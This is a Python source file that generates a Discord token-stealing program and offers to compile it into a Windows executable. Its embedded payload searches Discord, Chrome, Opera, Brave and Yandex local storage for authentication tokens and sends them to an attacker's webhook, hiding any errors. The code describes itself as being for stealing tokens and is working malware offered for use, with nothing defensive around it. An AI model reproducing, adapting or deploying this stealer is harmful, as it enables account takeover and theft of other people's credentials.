"""
 Copyright (c) 2022 GNU GENERAL PUBLIC

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
 """

import os
from colorama import Fore

FILE_CONTENT = """import os
import re
import json
from urllib.request import Request, urlopen

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'```**{platform}**```'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}'
        else:
            message += 'No tokens found.'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass"""


class Create:
    """
    Creates a file called tokenlogger.py for stealing tokens.

    Deprecated!
    """
    def __init__(self, webhook_url):
        # Create a new file inside a folder called tokenlogger
        print("[*] Creating tokenlogger.py...")
        # Create a directory called tokenlogger
        if not os.path.exists("tokenlogger"):
            os.mkdir("tokenlogger")
        # Create a new file called tokenlogger.py
        with open("tokenlogger/tokenlogger.py", "w") as f:
            # Write the content of the file
            f.write(FILE_CONTENT.replace("WEBHOOK_URL", f"'{webhook_url}'"))
            print(Fore.GREEN + "[*] Successfully created tokenlogger.py")
            f.close()
            print(
                Fore.GREEN + "[*] To make it as .exe file, run the following command: pyinstaller --onefile tokenlogger.py OR do it now? (y/n)")
            choice = input("[*] > ")
            if choice == "y":
                try:
                    os.system("pyinstaller --onefile tokenlogger/tokenlogger.py")
                    print(Fore.GREEN + "[*] Successfully created tokenlogger.exe")
                except Exception as e:
                    print(Fore.RED + "[*] Failed to create tokenlogger.exe")
                    print(Fore.RED + f"[*] Error: {e}")
